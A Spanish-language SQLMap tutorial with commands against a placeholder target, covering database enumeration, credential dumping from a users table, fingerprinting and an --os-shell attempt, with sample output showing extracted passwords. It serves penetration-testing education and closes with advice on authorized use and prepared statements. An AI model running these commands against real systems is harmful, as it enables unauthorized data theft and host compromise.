# SQLMap - Guía de Uso

## Qué es SQLMap

>SQLMap es una herramienta de código abierto que automatiza el proceso de detección y explotación de inyecciones SQL. Permite probar y explotar vulnerabilidades en bases de datos, extrayendo información y, en algunos casos, obteniendo acceso al sistema subyacente.

## Instalación en Debian (Parrot OS)
En Parrot, SQLMap ya viene preinstalado, pero en caso de necesitar reinstalarlo:

```bash
sudo apt update && sudo apt install sqlmap -y
```

Para verificar la instalación:
```bash
sqlmap --version
```

## Comandos útiles con ejemplos

### 1. Detección de inyección SQL en una URL
```bash
sqlmap -u "https://target.com/product?id=1" --batch --dbs
```
- `-u` Especifica la URL objetivo.
- `--batch` Acepta opciones predeterminadas sin preguntar.
- `--dbs` Enumera las bases de datos disponibles.

### 2. Enumerar tablas dentro de una base de datos específica
```bash
sqlmap -u "https://target.com/product?id=1" -D nombre_db --tables
```
- `-D` Especifica la base de datos objetivo.
- `--tables` Lista las tablas dentro de la base de datos seleccionada.

### 3. Obtener columnas de una tabla específica
```bash
sqlmap -u "https://target.com/product?id=1" -D nombre_db -T usuarios --columns
```
- `-T` Especifica la tabla a analizar.
- `--columns` Muestra las columnas de la tabla seleccionada.

### 4. Extraer datos de una tabla específica
```bash
sqlmap -u "https://target.com/product?id=1" -D nombre_db -T usuarios -C usuario,contraseña --dump
```
- `-C` Especifica las columnas a extraer.
- `--dump` Descarga los datos de las columnas indicadas.

### 5. Detectar el tipo de base de datos y sistema operativo
```bash
sqlmap -u "https://target.com/product?id=1" --fingerprint
```
- `--fingerprint` Intenta identificar el tipo de base de datos y detalles del sistema operativo.

### 6. Intentar obtener una shell en la base de datos
```bash
sqlmap -u "https://target.com/product?id=1" --os-shell
```
- `--os-shell` Lanza un shell interactivo en caso de que sea posible ejecutar comandos en el sistema.

## Explicación de salidas esperadas

### Base de datos vulnerable detectada
```
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] tienda_db
```
- Se confirma que la base de datos objetivo es MySQL.
- Se listan las bases de datos disponibles.

### Tablas encontradas dentro de una base de datos
```
Database: tienda_db
[3 tables]
+------------+
| clientes   |
| pedidos    |
| productos  |
+------------+
```
- SQLMap muestra las tablas dentro de la base de datos `tienda_db`.

### Columnas dentro de una tabla específica
```
Table: clientes
[4 columns]
+------------+----------+
| id         | int      |
| nombre     | varchar  |
| email      | varchar  |
| password   | varchar  |
+------------+----------+
```
- Se identifican las columnas dentro de la tabla `clientes`.

### Datos extraídos de la tabla `usuarios`
```
+----+------------+----------------+
| id | usuario    | contraseña     |
+----+------------+----------------+
| 1  | admin     | 123456          |
| 2  | user1     | password123     |
+----+------------+----------------+
```
- SQLMap ha extraído credenciales de usuarios.

## Conclusión
SQLMap es una herramienta potente para detectar y explotar inyecciones SQL de manera automatizada. Sin embargo, su uso debe ser responsable y siempre con autorización. Para protegerse contra estos ataques, es fundamental emplear consultas preparadas y validar correctamente las entradas del usuario.
